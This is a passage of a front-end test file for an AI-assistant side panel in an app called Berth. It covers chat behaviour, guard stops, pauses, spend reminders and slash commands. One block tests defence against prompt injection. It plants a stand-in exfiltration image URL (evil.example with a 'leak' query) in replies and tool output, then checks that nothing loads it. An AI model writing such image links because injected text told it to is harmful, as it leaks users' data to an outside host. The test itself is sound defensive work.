import { screen, waitFor, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import type { AgentStatus } from '../api/agent'
import type { Me } from '../api/auth'
import { renderInRoute } from '../test/render'
import { AgentPanel, AgentToggle } from './AgentPanel'
import { AgentProvider } from './AgentProvider'

/**
 * 側面板（M5 票 12，`.scratch/m5/side-panel-shape.md`）：AI 沒開時兩種角色各自的說明、
 * 只送最後一則、工具收成一行、重新載入接回對話、送不出去時字放回輸入欄。
 */

const ADMIN: Me = { name: 'skipper', role: 'admin' }
const USER: Me = { name: 'deckhand', role: 'user' }
const CONVERSATION = 'c-test'

interface Backend {
  me: Me
  enabled: boolean
  /** `GET /agent/conversations/{id}`：`null` 是 404（沒有這段）。 */
  stored: unknown[] | null
  /** `POST /agent/chat` 的回應（`signal` 是 `useChat` 的中止）。 */
  chat: (signal?: AbortSignal) => Response
  /** 今天的花費提醒與沒算進去的呼叫數（後端只給管理員，其他人是 `null`）。 */
  spend: AgentStatus['spend']
  /** `POST /agent/conversations/{id}/commands` 的回應（斜線指令，票 18）。 */
  command: (text: string) => Response
  /** provider 斷路器暫停到什麼時候（票 20）；管理員另有錯誤原文。 */
  pausedUntil: string | null
  pauseError: string
}

let sent: Record<string, unknown>[] = []
/** 送出的斜線指令（`{text}` 的字）。 */
let commanded: string[] = []

function backend(overrides: Partial<Backend>): Backend {
  return {
    me: ADMIN,
    enabled: true,
    stored: null,
    chat: () => stream(say('好。')),
    spend: { alerts: [], unknown_today: 0, unknown_before: 0 },
    command: () => json({ command: 'new' }),
    pausedUntil: null,
    pauseError: '',
    ...overrides,
  }
}

function json(body: unknown, status = 200) {
  return new Response(JSON.stringify(body), { status })
}

/** UI message stream（ai 7 的 wire）：一行一個 `data:`，最後 `[DONE]`。 */
function stream(chunks: object[]) {
  const body = [...chunks, 'DONE']
    .map((chunk) => `data: ${chunk === 'DONE' ? '[DONE]' : JSON.stringify(chunk)}\n\n`)
    .join('')
  return new Response(body, {
    status: 200,
    headers: { 'Content-Type': 'text/event-stream', 'x-vercel-ai-ui-message-stream': 'v1' },
  })
}

function say(text: string): object[] {
  return [
    { type: 'start' },
    { type: 'start-step' },
    { type: 'text-start', id: 't1' },
    { type: 'text-delta', id: 't1', delta: text },
    { type: 'text-end', id: 't1' },
    { type: 'finish-step' },
    { type: 'finish' },
  ]
}

function toolThenSay(text: string): object[] {
  return [
    { type: 'start' },
    { type: 'start-step' },
    { type: 'tool-input-start', toolCallId: 'call1', toolName: 'why_not_explain' },
    {
      type: 'tool-input-available',
      toolCallId: 'call1',
      toolName: 'why_not_explain',
      input: { media_id: 'tv:120089' },
    },
    {
      type: 'tool-output-available',
      toolCallId: 'call1',
      output: { conclusion: 'awaiting_review' },
    },
    { type: 'finish-step' },
    ...say(text).slice(1),
  ]
}

function serve(api: Backend) {
  sent = []
  commanded = []
  vi.stubGlobal(
    'fetch',
    vi.fn<typeof fetch>(async (input, init) => {
      const method = init?.method ?? 'GET'
      const path = typeof input === 'string' ? input : String(input)
      if (method === 'GET' && path === '/api/auth/me') return json(api.me)
      if (method === 'GET' && path === '/api/agent/status')
        return json({
          enabled: api.enabled,
          paused_until: api.pausedUntil,
          pause_error: api.pauseError,
          spend: api.spend,
        } satisfies AgentStatus)
      if (method === 'GET' && path.startsWith('/api/agent/conversations/')) {
        // 後端對沒有的那一段（含剛開的新對話）一律是 `conversation_missing`。
        return api.stored === null || path !== `/api/agent/conversations/${CONVERSATION}`
          ? json({ detail: { reason: 'conversation_missing', detail: CONVERSATION } }, 404)
          : json({ id: CONVERSATION, messages: api.stored })
      }
      if (method === 'POST' && path === `/api/agent/conversations/${CONVERSATION}/commands`) {
        const { text } = JSON.parse(String(init?.body)) as { text: string }
        commanded.push(text)
        return api.command(text)
      }
      if (method === 'POST' && path === '/api/agent/chat') {
        sent.push(JSON.parse(String(init?.body)) as Record<string, unknown>)
        return api.chat(init?.signal ?? undefined)
      }
      return json({ detail: 'Not Found' }, 404)
    }),
  )
}

function renderPanel() {
  return renderInRoute(
    <AgentProvider>
      <AgentToggle />
      <AgentPanel narrow={false} />
    </AgentProvider>,
    '/library',
  )
}

beforeEach(() => {
  sessionStorage.setItem('berth.agent.open', '1')
  localStorage.setItem('berth.agent.conversation', CONVERSATION)
})

afterEach(() => {
  sessionStorage.clear()
  localStorage.clear()
  vi.unstubAllGlobals()
})

describe('AgentPanel while AI is off', () => {
  it('points an administrator at the AI settings page', async () => {
    serve(backend({ me: ADMIN, enabled: false }))
    renderPanel()

    expect(await screen.findByText(/AI 還沒設定/)).toBeInTheDocument()
    expect(screen.getByRole('link', { name: '到 AI 設定' })).toHaveAttribute('href', '/settings/ai')
    expect(screen.queryByRole('textbox')).toBeNull()
  })

  it('tells anyone else that an administrator has not set it up, with nowhere to go', async () => {
    serve(backend({ me: USER, enabled: false }))
    renderPanel()

    expect(
      await screen.findByText('管理員還沒設定 AI。Berth 的其他功能照常可用。'),
    ).toBeInTheDocument()
    expect(screen.queryByRole('link')).toBeNull()
    expect(screen.queryByRole('textbox')).toBeNull()
    expect(screen.queryByRole('button', { name: '新對話' })).toBeNull()
  })
})

describe('AgentPanel in a conversation', () => {
  it('sends only the last message with the interface language, and shows the tool as one line', async () => {
    serve(backend({ chat: () => stream(toolThenSay('**SPY×FAMILY**：停在審核。')) }))
    const user = userEvent.setup()
    renderPanel()

    const input = await screen.findByRole('textbox', { name: '問助理' })
    await user.type(input, '第一句{Enter}')
    await screen.findByText('SPY×FAMILY')
    await user.type(input, 'SPY×FAMILY 為什麼沒入庫{Enter}')

    await waitFor(() => expect(sent).toHaveLength(2))
    const second = sent[1]
    expect(second.id).toBe(CONVERSATION)
    expect(second.language).toBe('zh-Hant')
    expect(second.messages).toHaveLength(1)
    expect((second.messages as { parts: { text: string }[] }[])[0].parts[0].text).toBe(
      'SPY×FAMILY 為什麼沒入庫',
    )

    const log = screen.getByRole('log', { name: '助理' })
    await waitFor(() => expect(within(log).getAllByText('查為什麼沒入庫')).toHaveLength(2))
    // 一行收著：參數與結果要展開才看得到。
    const [tool] = within(log).getAllByText('查為什麼沒入庫')
    const row = tool.closest('details')!
    expect(row).not.toHaveAttribute('open')
    expect(within(row).getByText('完成')).toBeInTheDocument()
    expect(within(row).getByText(/"media_id": "tv:120089"/)).toBeInTheDocument()
    expect(input).toHaveValue('')
  })

  it('picks the conversation back up from the server after a reload', async () => {
    serve(
      backend({
        stored: [
          { id: 'u1', role: 'user', parts: [{ type: 'text', text: '為什麼沒入庫？' }] },
          {
            id: 'a1',
            role: 'assistant',
            parts: [
              {
                type: 'tool-why_not_explain',
                toolCallId: 'call1',
                state: 'output-available',
                input: { media_id: 'tv:120089' },
                output: { conclusion: 'awaiting_review' },
              },
            ],
          },
          { id: 'a2', role: 'assistant', parts: [{ type: 'text', text: '停在審核等管理員。' }] },
        ],
      }),
    )
    renderPanel()

    expect(await screen.findByText('為什麼沒入庫？')).toBeInTheDocument()
    expect(screen.getByText('停在審核等管理員。')).toBeInTheDocument()
    // 一則回覆拆成兩則 UI 訊息時，「助理」只標一次。
    expect(within(screen.getByRole('log')).getAllByText('助理')).toHaveLength(1)
  })

  it('puts the text back and takes the message off the log when another turn is still running', async () => {
    serve(backend({ chat: () => json({ detail: { reason: 'busy', detail: '' } }, 409) }))
    const user = userEvent.setup()
    renderPanel()

    const input = await screen.findByRole('textbox', { name: '問助理' })
    await user.type(input, '還在嗎{Enter}')

    expect(await screen.findByText(/上一則還在回答/)).toBeInTheDocument()
    expect(input).toHaveValue('還在嗎')
    expect(within(screen.getByRole('log')).queryByText('還在嗎')).toBeNull()
  })

  it('does not send while the input method is still composing', async () => {
    serve(backend({}))
    const user = userEvent.setup()
    renderPanel()

    const input = await screen.findByRole('textbox', { name: '問助理' })
    await user.type(input, 'ㄨㄟˋ')
    input.dispatchEvent(
      new KeyboardEvent('keydown', { key: 'Enter', isComposing: true, bubbles: true }),
    )

    expect(sent).toHaveLength(0)
    expect(input).toHaveValue('ㄨㄟˋ')
  })

  it('closes on Escape and gives focus back to the toggle', async () => {
    serve(backend({}))
    const user = userEvent.setup()
    renderPanel()

    await user.click(await screen.findByRole('textbox', { name: '問助理' }))
    await user.keyboard('{Escape}')

    const toggle = screen.getByRole('button', { name: '助理' })
    expect(toggle).toHaveAttribute('aria-expanded', 'false')
    expect(toggle).toHaveFocus()
    expect(screen.queryByRole('log')).toBeNull()
  })
})

/**
 * 注入要模型在回覆裡塞外部圖片（M5 票 15 第 5 類）：圖片網址是常見的外洩通道（brief §14）。後端把模型
 * 寫的字原樣交成 `text` 片段（`tests/integration/test_agent_injection.py::TestImagesInTheReply`）；
 * 這裡證明整個面板——重新載入的回覆、工具結果、壓縮摘要、剛串流進來的回覆——都不載入它。
 * 單一元件怎麼畫在 `Markdown.test.tsx`（票 12）。
 */
describe('AgentPanel with a reply an injection wrote', () => {
  const PIXEL = 'https://evil.example/pixel.png?k=leak'
  const INJECTED = `好的。![ok](${PIXEL})\n\n<img src="${PIXEL}">\n\n![參照][p]\n\n[p]: ${PIXEL}`

  it('does not load an image an injected reply points at, anywhere in the panel', async () => {
    serve(
      backend({
        stored: [
          {
            id: 'u1',
            role: 'user',
            parts: [
              { type: 'data-compaction', data: { content: `較早的摘要 ![s](${PIXEL})` } },
              { type: 'text', text: '有什麼新的？' },
            ],
          },
          {
            id: 'a1',
            role: 'assistant',
            parts: [
              {
                type: 'tool-web_tavily_search',
                toolCallId: 'call1',
                state: 'output-available',
                input: { query: 'SPY×FAMILY' },
                output: [{ title: 'SPY×FAMILY', content: `![x](${PIXEL})` }],
              },
              // 前端不畫的片段型別：就算哪天後端交出來，也不該變成一張圖。
              { type: 'file', mediaType: 'image/png', url: PIXEL },
              { type: 'source-url', sourceId: 's1', url: PIXEL },
              { type: 'text', text: INJECTED },
            ],
          },
        ],
        chat: () => stream(say(`串流的回覆 ![ok](${PIXEL})`)),
      }),
    )
    const user = userEvent.setup()
    renderPanel()

    const log = await screen.findByRole('log')
    await within(log).findByText('有什麼新的？')
    await user.type(screen.getByRole('textbox', { name: '問助理' }), '再說一次{Enter}')
    // 等串流的那一則畫出來：存著的那幾段早就在了，只數「沒有載入」會在它之前就過。
    await within(log).findByText('串流的回覆')

    expect(document.querySelector('img, picture, video, audio, iframe, object, embed')).toBeNull()
    expect(document.querySelector('[src], [srcset], [poster]')).toBeNull()
    expect(document.querySelector(`a[href*="evil.example"]`)).toBeNull()
    // 網址照原文印出來，看得到它要往哪裡送。
    expect(within(log).getAllByText(PIXEL).length).toBeGreaterThan(0)
    const fetched = vi.mocked(fetch).mock.calls.map(([input]) => String(input))
    expect(fetched.filter((url) => url.includes('evil.example'))).toEqual([])
  })
})

describe('AgentPanel focus', () => {
  it('lands in the input once the conversation has loaded after the toggle opened it', async () => {
    sessionStorage.clear()
    serve(backend({}))
    const user = userEvent.setup()
    renderPanel()

    await user.click(await screen.findByRole('button', { name: '助理' }))

    await waitFor(() => expect(screen.getByRole('textbox', { name: '問助理' })).toHaveFocus())
  })
})

describe('AgentPanel new conversation', () => {
  it('starts an empty conversation under a new id and remembers it', async () => {
    serve(
      backend({
        stored: [{ id: 'u1', role: 'user', parts: [{ type: 'text', text: '舊的一句' }] }],
      }),
    )
    const user = userEvent.setup()
    renderPanel()

    expect(await screen.findByText('舊的一句')).toBeInTheDocument()
    await user.click(screen.getByRole('button', { name: '新對話' }))

    expect(await screen.findByText(/問 Berth 裡的事/)).toBeInTheDocument()
    expect(screen.queryByText('舊的一句')).toBeNull()
    const id = localStorage.getItem('berth.agent.conversation')
    expect(id).not.toBe(CONVERSATION)
    expect(id).toMatch(/^[A-Za-z0-9_-]{1,64}$/)
  })
})

describe('AgentPanel when the server turns the message down', () => {
  it('starts a new conversation when this one is gone, and keeps the text', async () => {
    serve(
      backend({
        chat: () => json({ detail: { reason: 'conversation_missing', detail: CONVERSATION } }, 404),
      }),
    )
    const user = userEvent.setup()
    renderPanel()

    const input = await screen.findByRole('textbox', { name: '問助理' })
    await user.type(input, '還在嗎{Enter}')

    expect(await screen.findByText(/這段對話已經不在了/)).toBeInTheDocument()
    expect(localStorage.getItem('berth.agent.conversation')).not.toBe(CONVERSATION)
    expect(screen.getByRole('textbox', { name: '問助理' })).toHaveValue('還在嗎')
  })

  it('switches to the AI-is-off note when AI was turned off in the meantime', async () => {
    const api = backend({})
    api.chat = () => {
      api.enabled = false
      return json({ detail: { reason: 'ai_disabled', detail: '' } }, 409)
    }
    serve(api)
    const user = userEvent.setup()
    renderPanel()

    await user.type(await screen.findByRole('textbox', { name: '問助理' }), '在嗎{Enter}')

    expect(await screen.findByText(/AI 還沒設定/)).toBeInTheDocument()
    expect(screen.queryByRole('textbox')).toBeNull()
  })
})

describe('AgentPanel links each reply to its steps', () => {
  it('puts one link under a reloaded reply, even when it came back as several messages', async () => {
    const turn = { runId: 'r1', pydantic_ai: { timestamp: '2026-10-27T02:00:00Z' } }
    serve(
      backend({
        stored: [
          { id: 'u1', role: 'user', parts: [{ type: 'text', text: '為什麼沒入庫？' }] },
          {
            id: 'a1',
            role: 'assistant',
            metadata: turn,
            parts: [
              {
                type: 'tool-why_not_explain',
                toolCallId: 'call1',
                state: 'output-available',
                input: { media_id: 'tv:120089' },
                output: { conclusion: 'awaiting_review' },
              },
            ],
          },
          {
            id: 'a2',
            role: 'assistant',
            metadata: turn,
            parts: [{ type: 'text', text: '停在審核。' }],
          },
        ],
      }),
    )
    renderPanel()

    await screen.findByText('停在審核。')
    const links = screen.getAllByRole('link', { name: '這則回覆的步驟' })
    expect(links).toHaveLength(1)
    expect(links[0]).toHaveAttribute('href', '/agent/runs/r1')
  })

  it('links a reply that just streamed in, from the turn id at the start of the stream', async () => {
    const chunks = say('好。')
    chunks[0] = { type: 'start', messageMetadata: { runId: 'r2' } }
    serve(backend({ stored: [], chat: () => stream(chunks) }))
    const user = userEvent.setup()
    renderPanel()

    await user.type(await screen.findByLabelText('問助理'), '在嗎？{Enter}')

    const link = await screen.findByRole('link', { name: '這則回覆的步驟' })
    expect(link).toHaveAttribute('href', '/agent/runs/r2')
  })
})

/** 防護停下的那一則（`data-stop`，串流與重新載入同一個形狀，M5 票 22）。 */
function stopPart(
  turnId: string,
  continuable: boolean,
  note = '這一輪停下了：同一個呼叫第 4 次。',
) {
  return {
    type: 'data-stop',
    data: { turn_id: turnId, reason: 'repeated_call', continuable, note },
  }
}

function stoppedStream(turnId: string, continuable: boolean): object[] {
  return [
    { type: 'start', messageMetadata: { runId: turnId } },
    { type: 'start-step' },
    { type: 'finish-step' },
    stopPart(turnId, continuable),
    { type: 'finish' },
  ]
}

describe('AgentPanel when a guard stops a turn', () => {
  it('says Berth stopped it, not the assistant, and continues once with the turn it picks up', async () => {
    let calls = 0
    serve(
      backend({
        stored: [],
        chat: () => stream(calls++ === 0 ? stoppedStream('r1', true) : say('接著查完了。')),
      }),
    )
    const user = userEvent.setup()
    renderPanel()

    await user.type(await screen.findByLabelText('問助理'), '一直查{Enter}')

    const log = screen.getByRole('log')
    expect(await within(log).findByText('停下')).toBeInTheDocument()
    expect(within(log).getByText('這一輪停下了：同一個呼叫第 4 次。')).toBeInTheDocument()
    await user.click(within(log).getByRole('button', { name: '繼續' }))

    expect(await within(log).findByText('接著查完了。')).toBeInTheDocument()
    expect(sent[1]).toMatchObject({ continues: 'r1', messages: [{ parts: [{ text: '繼續' }] }] })
    expect(sent[0]).not.toHaveProperty('continues')
    expect(within(log).queryByRole('button', { name: '繼續' })).toBeNull()
  })

  it('offers to continue only the last turn after a reload, and not one that cannot be', async () => {
    serve(
      backend({
        stored: [
          { id: 'u1', role: 'user', parts: [{ type: 'text', text: '一直查' }] },
          {
            id: 'a1',
            role: 'assistant',
            metadata: { runId: 'r1' },
            parts: [stopPart('r1', false)],
          },
          { id: 'u2', role: 'user', parts: [{ type: 'text', text: '再查' }] },
          {
            id: 'a2',
            role: 'assistant',
            metadata: { runId: 'r2' },
            parts: [stopPart('r2', true, '這一輪停下了：每輪 9 次的上限。')],
          },
        ],
      }),
    )
    renderPanel()

    const log = await screen.findByRole('log')
    expect(await within(log).findAllByText('停下')).toHaveLength(2)
    expect(within(log).getAllByRole('button', { name: '繼續' })).toHaveLength(1)
    // 「繼續」跟著最後那一則的說明。
    expect(
      within(log).getByRole('button', { name: '繼續' }).closest('[data-stop]'),
    ).toHaveTextContent('每輪 9 次的上限')
  })

  it('takes the button away when the server says the turn can no longer be continued', async () => {
    let calls = 0
    serve(
      backend({
        stored: [],
        chat: () =>
          calls++ === 0
            ? stream(stoppedStream('r1', true))
            : json({ detail: { reason: 'not_continuable', detail: 'r1' } }, 409),
      }),
    )
    const user = userEvent.setup()
    renderPanel()

    const input = await screen.findByLabelText('問助理')
    await user.type(input, '一直查{Enter}')
    const log = screen.getByRole('log')
    await user.click(await within(log).findByRole('button', { name: '繼續' }))

    expect(await screen.findByText(/這一輪已經不能繼續/)).toBeInTheDocument()
    expect(within(log).queryByRole('button', { name: '繼續' })).toBeNull()
    expect(within(log).queryByText('繼續')).toBeNull()
    expect(input).toHaveValue('')
  })

  it('shows the note the server kept after Stop, without a reload', async () => {
    const api = backend({ stored: [] })
    api.chat = (signal) => {
      const body = new ReadableStream<Uint8Array>({
        start(controller) {
          controller.enqueue(
            new TextEncoder().encode(
              `data: ${JSON.stringify({ type: 'start', messageMetadata: { runId: 'r1' } })}\n\n`,
            ),
          )
          signal?.addEventListener('abort', () => {
            // 伺服器收到斷線，存下說明（`Turn.close`）。
            api.stored = [
              { id: 'u1', role: 'user', parts: [{ type: 'text', text: '慢慢查' }] },
              {
                id: 'a1',
                role: 'assistant',
                metadata: { runId: 'r1' },
                parts: [
                  {
                    type: 'data-stop',
                    data: {
                      turn_id: 'r1',
                      reason: 'cancelled',
                      continuable: false,
                      note: '這一輪停下了：連線被關掉。',
                    },
                  },
                ],
              },
            ]
            controller.error(new DOMException('aborted', 'AbortError'))
          })
        },
      })
      return new Response(body, {
        status: 200,
        headers: { 'Content-Type': 'text/event-stream', 'x-vercel-ai-ui-message-stream': 'v1' },
      })
    }
    serve(api)
    const user = userEvent.setup()
    renderPanel()

    await user.type(await screen.findByLabelText('問助理'), '慢慢查{Enter}')
    await user.click(await screen.findByRole('button', { name: '停止' }))

    const log = screen.getByRole('log')
    expect(await within(log).findByText('這一輪停下了：連線被關掉。')).toBeInTheDocument()
    expect(within(log).getByText('停下')).toBeInTheDocument()
    expect(within(log).queryByRole('button', { name: '繼續' })).toBeNull()
  })
})

describe('AgentPanel keeps the keyboard focus', () => {
  it('moves it from Send to Stop and back when the button changes under it', async () => {
    let finish: () => void = () => {}
    serve(
      backend({
        stored: [],
        chat: () => {
          const body = new ReadableStream<Uint8Array>({
            start(controller) {
              const encode = (chunk: object) =>
                new TextEncoder().encode(`data: ${JSON.stringify(chunk)}\n\n`)
              controller.enqueue(encode({ type: 'start' }))
              finish = () => {
                for (const chunk of say('好。').slice(1)) controller.enqueue(encode(chunk))
                controller.enqueue(new TextEncoder().encode('data: [DONE]\n\n'))
                controller.close()
              }
            },
          })
          return new Response(body, {
            headers: { 'Content-Type': 'text/event-stream', 'x-vercel-ai-ui-message-stream': 'v1' },
          })
        },
      }),
    )
    const user = userEvent.setup()
    renderPanel()
    await user.type(await screen.findByLabelText('問助理'), '在嗎？')

    await user.click(screen.getByRole('button', { name: '送出' }))

    await waitFor(() => expect(screen.getByRole('button', { name: '停止' })).toHaveFocus())
    finish()
    await waitFor(() => expect(screen.getByRole('button', { name: '送出' })).toHaveFocus())
  })

  it('gives it to the input after Continue, whose button goes away', async () => {
    let calls = 0
    serve(
      backend({
        stored: [],
        chat: () => stream(calls++ === 0 ? stoppedStream('r1', true) : say('接著查完了。')),
      }),
    )
    const user = userEvent.setup()
    renderPanel()
    const input = await screen.findByLabelText('問助理')
    await user.type(input, '一直查{Enter}')

    await user.click(await screen.findByRole('button', { name: '繼續' }))

    expect(await screen.findByText('接著查完了。')).toBeInTheDocument()
    expect(input).toHaveFocus()
  })
})

describe('AgentPanel while the AI service is paused', () => {
  const until = () => new Date(Date.now() + 15 * 60_000).toISOString()

  it('tells anyone until when and that it comes back by itself, without the error', async () => {
    serve(backend({ me: USER, pausedUntil: until(), pauseError: '' }))
    renderPanel()

    const pause = (await screen.findByText('暫停')).closest('div')
    expect(pause).toHaveTextContent(/助理暫停到 \d{2}:\d{2}/)
    expect(pause).toHaveTextContent('自動恢復')
    expect(screen.queryByText('錯誤原文')).toBeNull()
    // 照樣可以打字：被擋下時才說（`ai_paused`）。
    expect(await screen.findByLabelText('問助理')).toBeInTheDocument()
  })

  it('shows an administrator the error and the way to the AI settings', async () => {
    serve(backend({ pausedUntil: until(), pauseError: 'HTTP 503 from api.example' }))
    renderPanel()

    expect(await screen.findByText('HTTP 503 from api.example')).toBeInTheDocument()
    expect(screen.getByRole('link', { name: '到 AI 設定' })).toHaveAttribute('href', '/settings/ai')
  })

  it('says nothing while it is not paused', async () => {
    serve(backend({}))
    renderPanel()

    await screen.findByLabelText('問助理')
    expect(screen.queryByText('暫停')).toBeNull()
  })

  it('asks again once the pause is over and takes the note away', async () => {
    vi.useFakeTimers({ shouldAdvanceTime: true })
    try {
      const api = backend({ pausedUntil: new Date(Date.now() + 2_000).toISOString() })
      serve(api)
      renderPanel()
      expect(await screen.findByText('暫停')).toBeInTheDocument()

      api.pausedUntil = null
      await vi.advanceTimersByTimeAsync(3_000)

      await waitFor(() => expect(screen.queryByText('暫停')).toBeNull())
    } finally {
      vi.useRealTimers()
    }
  })

  it('asks again when a turn ends, so a pause it caused shows up', async () => {
    const api = backend({ stored: [], chat: () => stream(stoppedStream('r1', false)) })
    serve(api)
    const user = userEvent.setup()
    renderPanel()

    api.pausedUntil = until()
    await user.type(await screen.findByLabelText('問助理'), '在嗎{Enter}')

    expect(await screen.findByText('暫停')).toBeInTheDocument()
  })
})

describe('AgentPanel spend reminders', () => {
  it('tells an administrator, with a way to the usage page, and still lets them ask', async () => {
    serve(
      backend({
        spend: {
          alerts: [{ kind: 'threshold', today: '1.2', against: '1' }],
          unknown_today: 0,
          unknown_before: 0,
        },
      }),
    )
    renderPanel()

    expect(
      await screen.findByText(/今天估計花了 \$1\.20，超過提醒值 \$1\.00。AI 照常可用。/),
    ).toBeInTheDocument()
    expect(screen.getByRole('link', { name: '看用量' })).toHaveAttribute('href', '/settings/usage')
    expect(await screen.findByLabelText('問助理')).toBeEnabled()
  })

  it('says nothing when there is nothing to remind', async () => {
    serve(backend({ me: USER, spend: null }))
    renderPanel()

    await screen.findByLabelText('問助理')
    expect(screen.queryByText('提醒')).not.toBeInTheDocument()
    expect(screen.queryByText('費用未知')).not.toBeInTheDocument()
  })

  it('does not look all clear when some costs are unknown and the reminders leave them out', async () => {
    serve(backend({ spend: { alerts: [], unknown_today: 2, unknown_before: 1 } }))
    renderPanel()

    expect(await screen.findByText(/有 3 次呼叫的費用未知，提醒沒算進它們。/)).toBeInTheDocument()
    expect(screen.getByText('費用未知')).toBeInTheDocument()
    expect(screen.getByRole('link', { name: '看用量' })).toHaveAttribute('href', '/settings/usage')
  })
})

describe('AgentPanel slash commands', () => {
  const USAGE = {
    command: 'usage',
    turns: 2,
    compactions: 1,
    requests: 3,
    tool_calls: 1,
    input_tokens: 12000,
    output_tokens: 800,
    cache_read_tokens: 6000,
    web_searches: 0,
    tavily_searches: 2,
    cost_usd: 0.0123,
  }

  it('lists the commands while a slash is being typed, narrows them, and Escape only closes the list', async () => {
    serve(backend({}))
    const user = userEvent.setup()
    renderPanel()

    const input = await screen.findByRole('textbox', { name: '問助理' })
    await user.type(input, '/')

    const hint = screen.getByRole('listbox', { name: '指令' })
    expect(
      within(hint)
        .getAllByRole('option')
        .map((option) => option.textContent),
    ).toEqual([
      '/new開一段新對話',
      '/compact壓縮這段對話，只留最後一輪',
      '/usage這段對話用了多少',
      '/status模型與上下文用了多少',
      '/pending還在等你決定的確認卡',
      '/skills助理會照著做的工作流程',
    ])
    expect(input).toHaveAttribute('aria-activedescendant', 'agent-slash-hint-new')

    await user.keyboard('{ArrowDown}')
    expect(within(hint).getByRole('option', { selected: true })).toHaveTextContent('/compact')
    expect(input).toHaveAttribute('aria-activedescendant', 'agent-slash-hint-compact')

    await user.type(input, 's')
    expect(within(screen.getByRole('listbox')).getAllByRole('option')).toHaveLength(2)
    await user.keyboard('{Tab}')
    expect(input).toHaveValue('/status')

    await user.keyboard('{Escape}')
    expect(screen.queryByRole('listbox')).toBeNull()
    expect(screen.getByRole('log')).toBeInTheDocument()
    // 不是指令的字不出清單。
    await user.clear(input)
    await user.type(input, '為什麼')
    expect(screen.queryByRole('listbox')).toBeNull()
  })

  it('runs a command picked with the mouse', async () => {
    serve(backend({ command: () => json(USAGE) }))
    const user = userEvent.setup()
    renderPanel()

    await user.type(await screen.findByRole('textbox', { name: '問助理' }), '/')
    await user.click(screen.getByRole('option', { name: /\/usage/ }))

    expect(await screen.findByRole('region', { name: '/usage' })).toBeInTheDocument()
    expect(commanded).toEqual(['/usage'])
  })

  it('completes a half-typed command on Enter, then runs it without asking the model', async () => {
    serve(backend({ command: () => json(USAGE) }))
    const user = userEvent.setup()
    renderPanel()

    const input = await screen.findByRole('textbox', { name: '問助理' })
    await user.type(input, '/us{Enter}')
    // 打到一半的先補完，不執行。
    expect(input).toHaveValue('/usage')
    expect(commanded).toEqual([])
    await user.keyboard('{Enter}')

    const output = await screen.findByRole('region', { name: '/usage' })
    expect(commanded).toEqual(['/usage'])
    expect(sent).toHaveLength(0)
    expect(input).toHaveValue('')
    const facts = within(output)
    expect(facts.getByText('回覆').nextSibling).toHaveTextContent('2')
    expect(facts.getByText('壓縮').nextSibling).toHaveTextContent('1')
    expect(facts.getByText('Input token').nextSibling).toHaveTextContent('12,000')
    expect(facts.getByText('快取命中').nextSibling).toHaveTextContent('50%')
    expect(facts.getByText('Tavily 搜尋').nextSibling).toHaveTextContent('2')
    expect(facts.getByText('估計費用').nextSibling).toHaveTextContent('$0.0123')
  })

  it('says unknown when a cost or cache count is unknown', async () => {
    serve(backend({ command: () => json({ ...USAGE, cost_usd: null, cache_read_tokens: null }) }))
    const user = userEvent.setup()
    renderPanel()

    await user.type(await screen.findByRole('textbox', { name: '問助理' }), '/usage{Enter}')

    const output = within(await screen.findByRole('region', { name: '/usage' }))
    expect(output.getByText('估計費用').nextSibling).toHaveTextContent('未知')
    expect(output.getByText('快取命中').nextSibling).toHaveTextContent('未知')
  })

  it('shows the model and how full the context is', async () => {
    serve(
      backend({
        command: () =>
          json({
            command: 'status',
            provider: 'anthropic',
            model: 'claude-sonnet-5-5',
            messages: 6,
            context_tokens: 32000,
            context_window: 128000,
            compact_at: 0.6,
            paused_until: null,
          }),
      }),
    )
    const user = userEvent.setup()
    renderPanel()

    await user.type(await screen.findByRole('textbox', { name: '問助理' }), '/status{Enter}')

    const output = within(await screen.findByRole('region', { name: '/status' }))
    expect(output.getByText('anthropic · claude-sonnet-5-5')).toBeInTheDocument()
    expect(output.getByText('32,000 / 128,000 token（25%）')).toBeInTheDocument()
    expect(output.getByText('一輪開頭到 60% 時')).toBeInTheDocument()
    expect(output.queryByText('暫停到')).toBeNull()
  })

  it('lists the cards waiting for me, here and elsewhere', async () => {
    const card = { rows: 1, expires_at: '2026-10-28T12:00:00Z', command: 'jobs.retry_job' }
    serve(
      backend({
        command: () =>
          json({
            command: 'pending',
            cards: [
              { ...card, id: 7, status: 'pending', here: true },
              { ...card, id: 9, status: 'detached', rows: 3, here: false },
            ],
          }),
      }),
    )
    const user = userEvent.setup()
    renderPanel()

    await user.type(await screen.findByRole('textbox', { name: '問助理' }), '/pending{Enter}')

    const output = within(await screen.findByRole('region', { name: '/pending' }))
    const [here, elsewhere] = output.getAllByRole('listitem')
    expect(here).toHaveTextContent('#7 jobs.retry_job')
    expect(here).toHaveTextContent('等你決定')
    expect(here).toHaveTextContent('1 列 · 這段對話')
    expect(elsewhere).toHaveTextContent('已脫離對話')
    expect(elsewhere).toHaveTextContent('3 列 · 別的對話')
  })

  it('says so when no card is waiting', async () => {
    serve(backend({ command: () => json({ command: 'pending', cards: [] }) }))
    const user = userEvent.setup()
    renderPanel()

    await user.type(await screen.findByRole('textbox', { name: '問助理' }), '/pending{Enter}')

    expect(await screen.findByText('沒有在等你決定的確認卡。')).toBeInTheDocument()
  })

  it('lists the skills with their descriptions as written', async () => {
    serve(
      backend({
        command: () =>
          json({
            command: 'skills',
            skills: [
              { name: 'why-not-imported', description: 'Find out why an episode is missing.' },
            ],
          }),
      }),
    )
    const user = userEvent.setup()
    renderPanel()

    await user.type(await screen.findByRole('textbox', { name: '問助理' }), '/skills{Enter}')

    const output = within(await screen.findByRole('region', { name: '/skills' }))
    expect(output.getByText('why-not-imported')).toBeInTheDocument()
    expect(output.getByText('Find out why an episode is missing.')).toHaveAttribute('lang', 'en')
  })

  it('starts a new conversation on /new', async () => {
    serve(
      backend({
        stored: [{ id: 'u1', role: 'user', parts: [{ type: 'text', text: '舊的一句' }] }],
        command: () => json({ command: 'new' }),
      }),
    )
    const user = userEvent.setup()
    renderPanel()

    expect(await screen.findByText('舊的一句')).toBeInTheDocument()
    await user.type(screen.getByRole('textbox', { name: '問助理' }), '/new{Enter}')

    expect(await screen.findByText(/問 Berth 裡的事/)).toBeInTheDocument()
    expect(screen.queryByText('舊的一句')).toBeNull()
    expect(localStorage.getItem('berth.agent.conversation')).not.toBe(CONVERSATION)
  })

  it('picks up the compacted history after /compact, with the summary folded up', async () => {
    const api = backend({
      stored: [
        { id: 'u1', role: 'user', parts: [{ type: 'text', text: '第一句' }] },
